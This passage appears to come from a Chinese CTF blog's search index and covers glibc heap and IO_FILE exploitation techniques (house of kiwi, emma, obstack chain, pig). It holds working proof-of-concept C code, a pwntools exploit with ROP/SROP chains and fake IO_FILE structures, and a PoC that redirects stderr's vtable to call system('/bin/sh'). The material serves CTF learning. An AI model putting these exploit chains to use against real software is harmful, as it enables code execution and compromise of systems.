free(a[2]);  printf(&quot;%X&quot;, 0);  return 0;&#125;\n\n最终实现的就是污染掉__printf_arginfo_table但是另一个table也不能为null所以也伪造上，不过不需要弄什么数据。\n具体过程大家可以去调试，这里用到了house of corrosion\nhouse of kiwi这一调用链通过触发__malloc_assert，调用fflush进而调用stderr中的_IO_file_jumps中的sync指针\n触发的方式也会有很多种，这里常用的就是在验证top chunk中的一种，house of force这篇文章中利用这是需要绕过这一assert，可以去看一下是什么assert\ngdb调试assert时发现fflush调用的是位于_IO_file_jumps中的_IO_file_sync指针,且观察发现RDX寄存器的值为IO_helper_jumps指针,多次调试发现RDX始终是一个固定的地址\n如果存在一个任意写,通过修改 _IO_file_jumps + 0x60的_IO_file_sync指针为setcontext+61修改IO_helper_jumps + 0xA0 and 0xA8分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/filter.h&gt;#include &lt;linux/seccomp.h&gt;#define pop_rdi_ret libc_base + 0x000000000002858F#define pop_rdx_r12 libc_base + 0x0000000000114161#define pop_rsi_ret libc_base + 0x000000000002AC3F#define pop_rax_ret libc_base + 0x0000000000045580#define syscall_ret libc_base + 0x00000000000611EA#define ret pop_rdi_ret+1size_t libc_base;size_t ROP[0x30];char FLAG[0x100] = &quot;./flag.txt\\x00&quot;;void sandbox()&#123;    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    struct sock_filter sfi[] =&#123;        &#123;0x20,0x00,0x00,0x00000004&#125;,        &#123;0x15,0x00,0x05,0xC000003E&#125;,        &#123;0x20,0x00,0x00,0x00000000&#125;,        &#123;0x35,0x00,0x01,0x40000000&#125;,        &#123;0x15,0x00,0x02,0xFFFFFFFF&#125;,        &#123;0x15,0x01,0x00,0x0000003B&#125;,        &#123;0x06,0x00,0x00,0x7FFF0000&#125;,        &#123;0x06,0x00,0x00,0x00000000&#125;    &#125;;    struct sock_fprog sfp = &#123;8, sfi&#125;;    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);&#125;void setROP()&#123;    uint32_t i = 0;    ROP[i++] = pop_rax_ret;    ROP[i++] = 2;    ROP[i++] = pop_rdi_ret;    ROP[i++] = (size_t)FLAG;    ROP[i++] = pop_rsi_ret;    ROP[i++] = 0;    ROP[i++] = syscall_ret;    ROP[i++] = pop_rdi_ret;    ROP[i++] = 3;    ROP[i++] = pop_rdx_r12;    ROP[i++] = 0x100;    ROP[i++] = 0;    ROP[i++] = pop_rsi_ret;    ROP[i++] = (size_t)(FLAG + 0x10);    ROP[i++] = (size_t)read;    ROP[i++] = pop_rdi_ret;    ROP[i++] = 1;    ROP[i++] = (size_t)write;&#125;int main() &#123;    setvbuf(stdin,0LL,2,0LL);    setvbuf(stdout,0LL,2,0LL);    setvbuf(stderr,0LL,2,0LL);    sandbox();    libc_base  = ((size_t)setvbuf) - 0x81630;    printf(&quot;LIBC:\\t%#lx\\n&quot;,libc_base);    size_t magic_gadget = libc_base + 0x53030 + 61; // setcontext + 61    size_t IO_helper = libc_base + 0x1E48C0; // _IO_hel    per_jumps;    size_t SYNC = libc_base + 0x1E5520; // sync pointer in _IO_file_jumps    setROP();    *((size_t*)IO_helper + 0xA0/8) = ROP; // 设置rsp    *((size_t*)IO_helper + 0xA8/8) = ret; // 设置rcx 即 程序setcontext运行完后会首先调用的指令地址    *((size_t*)SYNC) = magic_gadget; // 设置fflush(stderr)中调用的指令地址    // 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert    size_t *top_size = (size_t*)((char*)malloc(0x10) + 0x18);    *top_size = (*top_size)&amp;0xFFE; // top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在    malloc(0x1000); // 触发assert    _exit(-1);&#125;\n\n可以看到就只是劫持了sync为setcontext+61然后就是通过IO_helper控制rdx进而控制其他所有寄存器，实现ROP\n例题的话，后续会更一篇NULL_FxCK，因为用的Glibc为2.32所以会出现一系列问题，所以不增加这篇文章篇幅了\n\n参考链接：https://www.anquanke.com/post/id/235598\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of emma","url":"/2022/05/17/house-of-emma/","content":"在glibc2.34中删除了malloc_hook和free_hook，所以孕育而生了一个新的利用方法house of emma。这篇文章需要两个前置知识largebin attack和house of kiwi在这里就不再提了。然后后面一篇文章上次好像提了是写how2heap在glibc2.31之后的变化总结，不过会新加一个利用方式也是我今天才知道的Fastbin Reverse Into Tcache(先给自己挖个坑)\n利用原理为什么说house of emma的前置知识需要house of kiwi是因为其退出的方式是_exit(0)所以没有办法使用以往的fsop的方式来进行，调用的链子还是使用assert来触发。他们之间的不同点就是这里利用的vtable不一样。\nstatic const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_file_finish),  JUMP_INIT(overflow, _IO_file_overflow),  JUMP_INIT(underflow, _IO_file_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_default_pbackfail),  JUMP_INIT(xsputn, _IO_file_xsputn),  JUMP_INIT(xsgetn, _IO_default_xsgetn),  JUMP_INIT(seekoff, _IO_cookie_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_file_setbuf),  JUMP_INIT(sync, _IO_file_sync),  JUMP_INIT(doallocate, _IO_file_doallocate),  JUMP_INIT(read, _IO_cookie_read),  JUMP_INIT(write, _IO_cookie_write),  JUMP_INIT(seek, _IO_cookie_seek),  JUMP_INIT(close, _IO_cookie_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue),&#125;;\n\n这里使用的是上面的这个vtable，其中的几个函数\nstatic ssize_t_IO_cookie_read (FILE *fp, void *buf, ssize_t size)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_read_function_t *read_cb = cfile-&gt;__io_functions.read;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (read_cb);#endif  if (read_cb == NULL)    return -1;  return read_cb (cfile-&gt;__cookie, buf, size);&#125;static ssize_t_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_write_function_t *write_cb = cfile-&gt;__io_functions.write;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (write_cb);#endif  if (write_cb == NULL)    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      return 0;    &#125;  ssize_t n = write_cb (cfile-&gt;__cookie, buf, size);  if (n &lt; size)    fp-&gt;_flags |= _IO_ERR_SEEN;  return n;&#125;static off64_t_IO_cookie_seek (FILE *fp, off64_t offset, int dir)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_seek_function_t *seek_cb = cfile-&gt;__io_functions.seek;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (seek_cb);#endif  return ((seek_cb == NULL       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)           == -1)       || offset == (off64_t) -1)      ? _IO_pos_BAD : offset);&#125;static int_IO_cookie_close (FILE *fp)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_close_function_t *close_cb = cfile-&gt;__io_functions.close;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (close_cb);#endif  if (close_cb == NULL)    return 0;  return close_cb (cfile-&gt;__cookie);&#125;\n\n都是直接调用指针当作函数来调用，也就存在了一定的安全隐患了。\n\n这里查看汇编代码可以看到是将取出来的值首先循环右移了0x11接着与fs:0x30进行异或之后检验rax是否为空，最后再调用rax。\n#  define PTR_MANGLE(var) \\  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard_local)#  define PTR_DEMANGLE(var)     PTR_MANGLE (var)\n\n其实异或这一部也就是上面调用的这个函数干的事情。所以如果我们想要劫持程序执行流还必须泄漏这个的话就很麻烦了，所以我们不选择泄漏他的值，我们选择覆盖他的值，后面在往这里写入地址的时候作相应的处理即可。\n题目house of emma题目的逆向过程没什么好说的又不是cpp，所以这里就不再提。\n然后题目存在的漏洞就是free之后没有清空指针导致UAF了。\n其实懂了上面所描述的这道题就很好理解了，直接可以自己做出来了。\nexpfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)r = process(&#x27;./pwn&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;payload = b&#x27;&#x27;def create(idx, size):    global payload    payload += p8(0x1)    payload += p8(idx)    payload += p16(size)def delete(idx):    global payload    payload += p8(0x2)    payload += p8(idx)def show(idx):    global payload    payload += p8(0x3)    payload += p8(idx)def edit(idx, content):    global payload    payload += p8(0x4)    payload += p8(idx)    print(len(content))    payload += p16(len(content))    payload += contentdef run():    global payload    payload += p8(0x5)    if len(payload) &gt; 0x500:        error(&#x27;!!!&#x27;)    r.recvuntil(b&#x27;Pls input the opcode&#x27;)    r.send(payload)    payload = b&#x27;&#x27;create(0, 0x410)create(1, 0x410)create(2, 0x420)create(3, 0x430)delete(2)run()show(2)run()r.recvline()libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x1f30b0print(hex(libc_base))gadget_addr = libc_base + 0x146020pointer_chk_guard_local = libc_base + 0x234c10 + 0x2000setcontext_addr = libc_base + 0x50bfdpop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))pop_rsi = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))pop_rax = libc_base + next(libc.search(asm(&#x27;pop rax\\nret&#x27;)))syscall = libc_base + next(libc.search(asm(&#x27;syscall\\nret&#x27;)))edit(2, b&#x27;a&#x27; * 0x10)show(2)run()r.recvuntil(b&#x27;a&#x27; * 0x10)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x2ae0print(hex(heap_base))delete(0)edit(    2,    flat(libc_base + 0x1f30b0, libc_base + 0x1f30b0, heap_base + 0x2ae0,         libc_base + libc.symbols[&#x27;stderr&#x27;] - 0x20))create(5, 0x430)create(0, 0x410)run()delete(0)edit(    2,    flat(libc_base + 0x1f30b0, libc_base + 0x1f30b0, heap_base + 0x2ae0,         pointer_chk_guard_local))create(6, 0x430)run()def ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)create(7, 0x450)delete(7)create(8, 0x430)run()edit(7, b&#x27;a&#x27; * 0x430 + flat(0, 0x300))run()next_chain = 0srop_addr = heap_base + 0x2ae0 + 0x10fake_IO_FILE = 2 * p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0xffffffffffffffff)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)fake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(next_chain)fake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(heap_base)fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(0)fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(libc.sym[&#x27;_IO_cookie_jumps&#x27;] + 0x40)fake_IO_FILE += p64(srop_addr)fake_IO_FILE += p64(0)fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))fake_frame_addr = srop_addrframe = SigreturnFrame()frame.rdi = fake_frame_addr + 0xF8frame.rsi = 0frame.rdx = 0x100frame.rsp = fake_frame_addr + 0xF8 + 0x10frame.rip = pop_rdi + 1rop_data = [    pop_rax, 2, syscall, pop_rax, 0, pop_rdi, 3, pop_rsi,    fake_frame_addr + 0x200, syscall, pop_rax, 1, pop_rdi, 1, pop_rsi,    fake_frame_addr + 0x200, syscall]pay = p64(0) + p64(fake_frame_addr) + b&#x27;\\x00&#x27; * 0x10 + p64(setcontext_addr +                                                           61)pay += bytes(frame).ljust(0xF8, b&#x27;\\x00&#x27;)[0x28:] + b&#x27;flag&#x27;.ljust(    0x10, b&#x27;\\x00&#x27;) + flat(rop_data)edit(0, pay)edit(2, fake_IO_FILE)run()create(9, 0x450)run()gdb.attach(r)r.interactive()\n\n反思与总结上面exp其实是跑不通的，主要原因就是ld在不同环境的偏移不一致导致的，在我的docker环境中pointer_chk_guard_local指针的地址位于不可写的地方，所以我就随便找到了个地方代替他，就假装修改了。\n这一利用方式中可以看出来大量使用了large bin attack，并且题目的并没有存在可以任意地址写的漏洞，或者说是构造出这样一个漏洞出来，所以这一利用方式的限制条件其实也比较小。\n\n参考文章：\nhttps://blog.wjhwjhn.com/archives/751/\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of lalala","url":"/2022/12/01/house-of-lalala/","content":"近期又出现一个新的关于IO_FILE的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。\n原理分析此次聚焦的vtable表为:\n/* the jump table.  */const struct _IO_jump_t _IO_obstack_jumps libio_vtable attribute_hidden =&#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, NULL),  JUMP_INIT(overflow, _IO_obstack_overflow),  JUMP_INIT(underflow, NULL),  JUMP_INIT(uflow, NULL),  JUMP_INIT(pbackfail, NULL),  JUMP_INIT(xsputn, _IO_obstack_xsputn),  JUMP_INIT(xsgetn, NULL),  JUMP_INIT(seekoff, NULL),  JUMP_INIT(seekpos, NULL),  JUMP_INIT(setbuf, NULL),  JUMP_INIT(sync, NULL),  JUMP_INIT(doallocate, NULL),  JUMP_INIT(read, NULL),  JUMP_INIT(write, NULL),  JUMP_INIT(seek, NULL),  JUMP_INIT(close, NULL),  JUMP_INIT(stat, NULL),  JUMP_INIT(showmanyc, NULL),  JUMP_INIT(imbue, NULL)&#125;;\n\n主要利用的结构体为:\nstruct _IO_obstack_file&#123;  struct _IO_FILE_plus file;  struct obstack *obstack;&#125;;\n\n也就是在IO_FILE结构体下加一个obstack结构体指针。下面则是obstack结构体的定义:\nstruct obstack          /* control current object in current chunk */&#123;  long chunk_size;              /* preferred size to allocate chunks in */  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */  char *object_base;            /* address of object we are building */  char *next_free;              /* where to add next char to current object */  char *chunk_limit;            /* address of char after current chunk */  union  &#123;    PTR_INT_TYPE tempint;    void *tempptr;  &#125; temp;                       /* Temporary for some macros.  */  int alignment_mask;           /* Mask of alignment for each object. */  /* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use     casts to the prototypeless function type in all assignments,     but having prototypes here quiets -Wstrict-prototypes.  */  struct _obstack_chunk *(*chunkfun) (void *, long);  void (*freefun) (void *, struct _obstack_chunk *);  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */  unsigned maybe_empty_object : 1; /* There is a possibility that the current                      chunk contains a zero-length object.  This                      prevents freeing the chunk if we allocate                      a bigger chunk to replace it. */  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed                     handler on error, but retained for binary                     compatibility.  */&#125;;\n\n可以看到，上述的vtable中只有_IO_obstack_overflow、_IO_obstack_xsputn这样两个函数，首先关注前一个\n_IO_obstack_overflowstatic int_IO_obstack_overflow (_IO_FILE *fp, int c)&#123;  struct obstack *obstack = ((struct _IO_obstack_file *) fp)-&gt;obstack;  int size;  /* Make room for another character.  This might as well allocate a     new chunk a memory and moves the old contents over.  */  assert (c != EOF);  obstack_1grow (obstack, c);  /* Setup the buffer pointers again.  */  fp-&gt;_IO_write_base = obstack_base (obstack);  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);  size = obstack_room (obstack);  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;  /* Now allocate the rest of the current chunk.  */  obstack_blank_fast (obstack, size);  return c;&#125;\n\n可以看到其中存在一个assert，注意下面如果我们走exit这条路来清空所有缓存时触发的话就会出现rsi必定为-1的情况，所以此路不通\n\n_IO_obstack_xsputnstatic size_t_IO_obstack_xsputn (FILE *fp, const void *data, size_t n)&#123;  struct obstack *obstack = ((struct _IO_obstack_file *) fp)-&gt;obstack;  if (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)    &#123;      int size;      /* We need some more memory.  First shrink the buffer to the\t space we really currently need.  */      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);      /* Now grow for N bytes, and put the data there.  */      obstack_grow (obstack, data, n);      /* Setup the buffer pointers again.  */      fp-&gt;_IO_write_base = obstack_base (obstack);      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);      size = obstack_room (obstack);      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;      /* Now allocate the rest of the current chunk.  */      obstack_blank_fast (obstack, size);    &#125;  else    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);  return n;&#125;\n\n这里我们的目标时调用到obstack_grow函数，所以我们需要进入这个if语句，这一点很好说，如果我们可以控制这个结构体就可以非常轻松的控制这里的值而后进入if语句，随后又会执行obstack_blank_fast函数\n#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))\n\n这个其实是一个宏定义，可以看到内部其实不会特别影响后续的内容。在继续执行就会进入我们期望的函数:\n#define obstack_grow(OBSTACK, where, length)                      \\  __extension__                                   \\    (&#123; struct obstack *__o = (OBSTACK);                       \\       int __len = (length);                              \\       if (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \\     _obstack_newchunk (__o, __len);                      \\       memcpy (__o-&gt;next_free, where, __len);                     \\       __o-&gt;next_free += __len;                           \\       (void) 0; &#125;)\n\n可以看到这个也是一个宏定义，同样的我们又必须通过_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit这条if语句才能调用到_obstack_newchunk函数。\nvoid  _obstack_newchunk (struct obstack *h, int length)&#123;  struct _obstack_chunk *old_chunk = h-&gt;chunk;  struct _obstack_chunk *new_chunk;  long new_size;  long obj_size = h-&gt;next_free - h-&gt;object_base;  long i;  long already;  char *object_base;  /* Compute size for new chunk.  */  new_size = (obj_size + length) + (obj_size &gt;&gt; 3) + h-&gt;alignment_mask + 100;  if (new_size &lt; h-&gt;chunk_size)    new_size = h-&gt;chunk_size;  /* Allocate and initialize the new chunk.  */  new_chunk = CALL_CHUNKFUN (h, new_size);  if (!new_chunk)    (*obstack_alloc_failed_handler)();  h-&gt;chunk = new_chunk;  new_chunk-&gt;prev = old_chunk;  new_chunk-&gt;limit = h-&gt;chunk_limit = (char *) new_chunk + new_size;  // ...&#125;\n\n可以看到这里可以直接调用到我们期望的宏定义CALL_CHUNKFUN:\n# define CALL_CHUNKFUN(h, size) \\  (((h)-&gt;use_extra_arg)\t\t\t\t\t\t\t      \\   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))\t\t\t\t      \\   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))\n\n可以看到这里存在直接拿指针当作函数的操作(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))，条件也就是(((h)-&gt;use_extra_arg)不为0；\n总结所以从上到下的调用链也是可以直接写出来了:\n_IO_obstack_xsputn=&gt;obstack_grow=&gt;_obstack_newchunk=&gt;CALL_CHUNKFUN=&gt;(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))\n最后再根据结构体属性的偏移写上上述约束的值即可。\n当_IO_list_all指向我们可控A地址时，我们需要对A地址写入如下数据：\nA + 0x18 = 1;A + 0x20 = 0;A + 0x28 = 1;A + 0x30 = 0;A + 0x38 = system_addr;A + 0x48 = bin_sh_addr;A + 0x50 = 1;A + 0xd8 = _IO_obstack_jumps+0x20;A + 0xe0 = A;\n\n\npoc#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;char bin_sh_addr[0x10];int main()&#123;\tunsigned long libc_base;\tunsigned long printf_addr;\tunsigned long *IO_2_1_stderr;\tunsigned long IO_obstack_jumps;\tstrcpy(bin_sh_addr,&quot;/bin/sh&quot;);\tprintf(&quot;start!\\n&quot;);\tprintf_addr = printf;\tlibc_base = printf_addr - 0x55700;\tIO_2_1_stderr = libc_base + 0x1f7680;\tIO_obstack_jumps = libc_base + 0x1f33a0;\t*(IO_2_1_stderr + (0x28/8)) = 0x1;\t*(IO_2_1_stderr + (0x30/8)) = 0;\t*(IO_2_1_stderr + (0x18/8)) = 1;\t*(IO_2_1_stderr + (0x20/8)) = 0;\t*(IO_2_1_stderr + (0x50/8)) = 1;\t*(IO_2_1_stderr + (0xd8/8)) = IO_obstack_jumps+0x20;\t*(IO_2_1_stderr + (0xe0/8)) = IO_2_1_stderr;\t*(IO_2_1_stderr + (0x38/8)) = system;\t*(IO_2_1_stderr + (0x48/8)) = bin_sh_addr;\treturn 0;&#125;\n\n以上libc均使用:Ubuntu GLIBC 2.36-0ubuntu4\n\n参考文章\nhttps://tttang.com/archive/1845/#toc_\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of pig","url":"/2022/03/01/house-of-pig/","content":"在最近做题的过程中发现自己的逆向能力很是欠缺，在梳理程序的逻辑的时候总是会梳理不清，尤其是程序当中存在复杂的结构体时或则存在cpp代码时，脑子就像有浆糊一样，后续会针对自己的逆向能力下手多练习相关题目。\nida恢复跳表首先看到main函数存在这样一句\n\n看不懂就直接看汇编。\n\n可以看出来其实这里是一个类似与switch的语句。只不过ida没有翻译过来。\n恢复的办法就是在IDA的edit当中的other里用Specify switch idiom\n\n\n\nAddress of Jump table：设置成 jump table 的地址\nNumber of elements：设置为 jump table 中存在的元素总数\nSize of table element：设置为 jump table 中元素的类型\nElement shift amount：这个一般情况下都是零，和跳表计算时的方式有关，比如此题只是单纯的跳表地址加跳表中的元素，那么就不需要移位\nElement base value：设置为计算跳转地址时给跳表元素加的值，比如此题的计算方法为 &amp;unk_69E0 + unk_69E0[i]，那么这里就应该填跳表的地址\nStart of the switch idiom：这个默认就行，就是获取跳表值的语句的地址\nInput register of switch：设置为用于给跳表寻址的寄存器\nFirst(lowest) input value：就是 switch 的最小值了\nDefault jump address：也就是 default 的跳转位置，其实有时候可以不填，但是最好还是填上，这个一般在上方不远处的 cmp 指令附近，特征就是判断了输入，然后跳转到某个地址上，跳转的这个地址就是要填的值了\n\n\n以上是各参数的意义\n\n最终填写的结果是这样。\n\n最终呈现的结果是这样。\n在Glibc2.31下的FSOP在以前纯粹讲解FSOP的时候发现的问题是，在2.29时的_IO_str_overflow函数就没有了用变量当作函数来调用，但是源码中还存在这样一段代码：\nchar *new_buf;char *old_buf = fp-&gt;_IO_buf_base;size_t old_blen = _IO_blen (fp);size_t new_size = 2 * old_blen + 100;if (new_size &lt; old_blen)    return EOF;new_buf = malloc (new_size);if (new_buf == NULL)&#123;    /*\t  __ferror(fp) = 1; */    return EOF;&#125;if (old_buf)&#123;    memcpy (new_buf, old_buf, old_blen);    free (old_buf);    /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */    fp-&gt;_IO_buf_base = NULL;&#125;\n\n当中调用了malloc然后memcpy到堆上，最后free掉，这样对于只存在calloc的程序可以说是毁灭性的打击。具体在题目中演示\n流程分析题目依旧是菜单题，不同的是，题目是存在三个角色，每个角色在创建堆块和修改堆块时都是不一样的。\n在这里先把角色的结构体给大家：\nstruct pig&#123;    chunk_arr[24];    chunk_size[24];    chunk_exist[24];    chunk_freed[24];&#125;\n\n这里是第一个角色Peppa的create\nunsigned __int64 __fastcall create_1(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  __int64 v3; // rax  __int64 v4; // rax  int i; // [rsp+18h] [rbp-18h]  int j; // [rsp+1Ch] [rbp-14h]  int v8; // [rsp+20h] [rbp-10h]  unsigned __int64 v9; // [rsp+28h] [rbp-8h]  v9 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 19 &amp;&amp; *(a1 + 8LL * i); ++i )    ;  if ( i == 20 )  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Message is full!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  else  &#123;    if ( *(users + 84) &lt;= 143 )      *(users + 84) = 144;    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message size: &quot;);    v8 = input_int();    if ( v8 &gt;= *(users + 84) &amp;&amp; v8 &lt;= 0x430 )    &#123;      *(users + 0x54) = v8;      *(a1 + 8LL * i) = calloc(1uLL, v8);      if ( !*(a1 + 8LL * i) )      &#123;        v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error calloc!&quot;);        std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        exit(-1);      &#125;      *(a1 + 4 * (i + 0x30LL)) = v8;      *(a1 + i + 0x120) = 0;      *(a1 + i + 0x138) = 0;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the Peppa&#x27;s message: &quot;);      for ( j = 0; j &lt; v8 / 48; ++j )        sub_2DBC((*(a1 + 8LL * i) + 48 * j), 16LL);      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;    else    &#123;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error size!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  return __readfsqword(0x28u) ^ v9;&#125;\n\n可以看到上面是让下一次创建的堆块必须大于或则等于上一次创建的，以及在后面的for循环里写入内容中间都会出现两行空白sub_2DBC((*(a1 + 8LL * i) + 48 * j), 16LL);。在第二个角色也就是Mummy，创建堆块的规则是一样的，不过写入内容是sub_2DBC((*(a1 + 8LL * i) + 48 * j + 16LL), 16LL);\n但是第三个角色有所区别：\nunsigned __int64 __fastcall create_3(__int64 a1)&#123;  __int64 v1; // rax  __int64 v2; // rax  __int64 v3; // rax  __int64 v4; // rax  __int64 v5; // rax  __int64 v6; // rax  int i; // [rsp+10h] [rbp-20h]  int j; // [rsp+14h] [rbp-1Ch]  int v10; // [rsp+18h] [rbp-18h]  _BYTE *v11; // [rsp+20h] [rbp-10h]  unsigned __int64 v12; // [rsp+28h] [rbp-8h]  v12 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 4 &amp;&amp; *(a1 + 8LL * i); ++i )    ;  if ( i == 5 )  &#123;    v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Message is full!&quot;);    std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  &#125;  else  &#123;    if ( *(users + 256) &lt;= 143 )      *(users + 256) = 144;    std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the message size: &quot;);    v10 = input_int();    if ( v10 &gt; 143 &amp;&amp; v10 &lt;= 0x440 )    &#123;      *(users + 256) = v10;      *(a1 + 8LL * i) = calloc(1uLL, v10);      if ( !*(a1 + 8LL * i) )      &#123;        v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error calloc!&quot;);        std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        exit(-1);      &#125;      *(a1 + 4 * (i + 48LL)) = v10;      *(a1 + i + 288) = 0;      *(a1 + i + 312) = 0;      std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Input the Daddy&#x27;s message: &quot;);      for ( j = 0; j &lt; v10 / 48; ++j )        sub_2DBC((*(a1 + 8LL * i) + 48 * j + 32LL), 16LL);      v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);      std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      if ( i == 4 )      &#123;        v11 = calloc(1uLL, 0xE8uLL);        v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;01dwang&#x27;s Gift:&quot;);        std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        sub_2D09(v11, 0xE8LL);        v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Success!&quot;);        std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);      &#125;    &#125;    else    &#123;      v2 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;Error size!&quot;);      std::ostream::operator&lt;&lt;(v2, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    &#125;  &#125;  return 